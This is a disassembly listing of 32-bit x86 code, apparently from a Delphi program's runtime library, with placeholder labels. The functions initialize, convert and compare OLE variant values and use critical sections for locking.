mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_412fe4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed9c
sub_413004
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ed9c
sub_413024
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed9c
sub_413044
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed9c
sub_413064
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40ed9c
sub_413084
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed9c
sub_4130a4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ed9c
sub_4130d0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40ed9c
sub_4130f4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ed9c
sub_413120
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ed9c
sub_41314c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ed9c
sub_413178
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ed9c
sub_4131dc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fa4
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed9c
sub_413208
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_40482c
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed9c
sub_413240
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4057d4
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed9c
sub_41326c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4057d4
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed9c
sub_413298
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40e67c
mov bx 0x8
jmp r-xdata
sub_4132bc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41337f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f140
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413b70
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413386
lea eax [ ebp - 0x11 ]
call sub_40ee18
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413353
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f140
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413b70
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40ee18
retn
sub_4133a4
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40e6d0
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e6d0
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40e6d0
jmp r-xdata
je r-xdata
call sub_40e67c
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_4134a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_4134dc
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413504
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_41352c
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413558
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_4135b3
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_412130
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412130
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407da8
xor edx edx
call sub_41348c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4135ba
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
sub_4135c4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_413298
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_413298
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40e67c
mov al 0x1
jmp [ edx * 4 + jump_table_413615 ]
call sub_40e67c
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_413390
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_4133a4
jmp r-xdata
mov eax edi
call sub_40f7d0
push eax
mov eax esi
call sub_40f7d0
pop edx
call sub_41348c
jmp r-xdata
mov eax esi
call sub_410294
push edx
push eax
mov eax edi
call sub_410294
push edx
push eax
call sub_4134a0
jmp r-xdata
mov eax esi
call sub_410da4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_410da4
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_4134dc
jmp r-xdata
mov eax esi
call sub_411514
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411514
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413504
jmp r-xdata
mov eax esi
call sub_411a7c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_411a7c
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_41352c
jmp r-xdata
mov edx edi
mov eax esi
call sub_413558
jmp r-xdata
mov eax edi
call sub_410890
and eax 0x7f
push eax
mov eax esi
call sub_410890
and eax 0x7f
pop edx
call sub_41348c
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_4132bc
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_413750
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_413390
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_413390
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_41432c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_4133a4
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_41432c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_4133a4
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40e67c
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e67c
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4138e9
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f40c
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_41432c
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413a7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f40c
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4139d9
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f40c
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_4135c4
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ee18
retn
call sub_40e58c
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41385b
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f40c
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e67c
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_4135c4
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ee18
retn
call sub_40e58c
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ee18
retn
call sub_40e58c
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ee18
retn
call sub_40e58c
call sub_40e67c
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413b31
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f40c
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ee18
retn
call sub_40e58c
sub_413b70
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_413b70
jmp r-xdata
call sub_4135c4
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_413b70
jmp r-xdata
pop edi
pop esi
retn
call sub_413750
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_4135c4
jmp r-xdata
sub_413d5c
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413e82
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403fa4
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403fa4
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41432c
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403fa4
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40425c
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408194
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_40425c
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030a4
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402874
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4041b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413e89
lea eax [ ebp - 0x208 ]
call sub_403f50
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40425c
sub_413ee0
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_413ed0
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_41432c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_413f54
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_413ed0
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_413ed0
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_4144d4
sete al
xor eax eax
jmp r-xdata
sub_413ff0
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_413ff0
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_41403c
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_413ff0
pop ecx
pop edx
retn
sub_414079
cmp al ah
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
idiv esi
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_41432c
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4142ac
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_414088
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4140e9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404f48
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4140f0
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403154
sub_414138
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4142ac
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_41432c
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41418c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4141c4
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4142ac
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414200
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403508
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414263
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41426a
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_414304
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403208
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41432c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4143d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404f48
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4143e4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4144ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41449d
